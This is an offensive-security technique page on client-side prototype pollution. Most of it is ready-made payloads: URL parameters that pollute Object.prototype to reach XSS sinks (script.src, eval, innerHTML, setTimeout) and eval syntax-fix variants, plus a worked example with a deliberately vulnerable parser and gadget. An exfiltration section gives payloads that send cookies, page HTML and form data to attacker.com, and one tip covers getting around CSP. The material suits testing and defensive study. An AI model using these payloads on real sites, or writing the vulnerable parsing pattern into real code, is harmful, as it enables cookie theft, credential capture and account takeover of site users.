# Prototype Pollution — Client-Side (CSPP)

## When this applies

JavaScript executing in the browser merges attacker-controlled keys (URL query/hash, `postMessage`, `fetch` body, JSON in DOM) into objects without filtering `__proto__` or `constructor.prototype`. Pollution then reaches a *gadget* — code that reads `obj.someProperty` and uses it as a script src, `innerHTML`, `eval` argument, or other dangerous sink.

## Technique

1. Pollute `Object.prototype` via URL parameter parsing (deparam, jQuery `$.extend`, etc.).
2. Trigger a gadget that does `if (config.transport_url) { ... script.src = config.transport_url; ... }` or similar.
3. Achieve XSS, redirect, or DOM tampering depending on the gadget.

## Steps

### Client-Side XSS Payloads

```javascript
// Basic XSS via transport_url gadget
?__proto__[transport_url]=data:,alert(1);
?__proto__[transport_url]=data:,alert(document.domain);
?__proto__[transport_url]=data:,alert(document.cookie);

// Browser API bypass (value property)
?__proto__[value]=data:,alert(1);

// Hash-based (third-party libraries)
#__proto__[hitCallback]=alert(1)
#__proto__[hitCallback]=alert(document.cookie)

// Constructor alternative
?constructor[prototype][transport_url]=data:,alert(1);

// Fetch API header injection
?__proto__[headers][X-Custom]=<img src=x onerror=alert(1)>

// jQuery selector injection
?__proto__[url]=javascript:alert(1)

// eval() sink
?__proto__[code]=alert(1)

// setTimeout() sink
?__proto__[callback]=alert(1)

// innerHTML sink
?__proto__[html]=<img src=x onerror=alert(1)>
```

### Client-Side Data Exfiltration

```javascript
// Cookie theft
?__proto__[transport_url]=data:,fetch('//attacker.com?c='+document.cookie);

// Credentials exfiltration
?__proto__[callback]=function(){fetch('//attacker.com',{method:'POST',body:document.body.innerHTML})}

// Form data capture
?__proto__[onsubmit]=function(e){fetch('//attacker.com?data='+JSON.stringify(e.target))}
```

### End-to-End Walkthrough

**Vulnerable code (deparam.js):**
```javascript
function deparam(params) {
    let obj = {};
    params.replace(/([^=&]+)=([^&]*)/g, function(m, key, value) {
        obj[decodeURIComponent(key)] = decodeURIComponent(value);
    });
    return obj;
}
// Usage: deparam(location.search.substring(1))
// Allows: ?__proto__[property]=value
```

**Gadget (searchLogger.js):**
```javascript
let config = {};
if (config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}
```

**Step 1 - Pollution:**
```javascript
// URL: /?__proto__[transport_url]=data:,alert(1);//
// deparam.js processes this and creates:
Object.prototype.transport_url = 'data:,alert(1);//'
```

**Step 2 - Gadget triggers:**
```javascript
let config = {}; // Empty object
if (config.transport_url) { // undefined in config, checks prototype
    // Object.prototype.transport_url exists!
    let script = document.createElement('script');
    script.src = config.transport_url; // 'data:,alert(1);//'
    document.body.appendChild(script); // XSS!
}
```

**Step 3 - Execution:**
```html
<script src="data:,alert(1);//"></script>
```

### Alternative Vector: eval Gadget with Syntax Fix

When the gadget concatenates pollution into an `eval()` string with trailing characters:
```javascript
let manager = {};
if (manager && manager.sequence) {
    eval('manager.macro(' + manager.sequence + ')');
}
```

The closing `)` after the value forces a syntax fix:
```
/?__proto__.sequence=alert(1)-
```

Result: `eval('manager.macro(alert(1)-)')` — `alert(1)` runs first, then `undefined - undefined = NaN`, `manager.macro(NaN)` may error but XSS is achieved.

**Alternative syntax fixes:**
```javascript
// Using semicolon and comment
/?__proto__.sequence=alert(1);//

// Using comma operator
/?__proto__.sequence=alert(1),0

// Using boolean operator
/?__proto__.sequence=alert(1)||0

// Using void
/?__proto__.sequence=void(alert(1))

// Using assignment
/?__proto__.sequence=x=alert(1)
```

## Verifying success

- After visiting the polluted URL, `Object.prototype.<key>` returns the injected value (DevTools).
- Gadget triggers a visible payload — `alert(1)` fires, exfil request appears in DevTools Network tab, etc.
- Without the URL parameter (or after `delete Object.prototype.<key>`), the gadget's behavior reverts to default. Confirms causation, not correlation.

## Common pitfalls

1. **Wrong sink for the gadget** — `data:,alert(1);//` only works for sinks that load it as JS (script.src, eval); for `innerHTML` use HTML payload `<img src=x onerror=alert(1)>`.
2. **CSP `script-src` blocks `data:` URIs** — most modern apps disallow `script-src data:`. Pivot to gadgets that use `eval`, `Function`, or DOM-based execution.
3. **Pollution doesn't reach the gadget** — gadget runs *before* pollution. Confirm script load order.
4. **Hash-based pollution requires a hashchange-aware parser** — only some libraries parse `location.hash` automatically.
5. **DOM Invader misses minified gadgets** — manually grep the bundle for `obj.<property>` patterns matching common gadgets.

## Tools

- **DOM Invader (Burp built-in)** — auto-detect sources and gadgets
- **`BlackFan/client-side-prototype-pollution`** — community-curated CSPP gadget collection
- **PPScan browser extension** — real-time detection while browsing
- **DevTools → Sources → script breakpoints on `script.src=`, `eval`, `Function`** — trace pollution flow into sinks
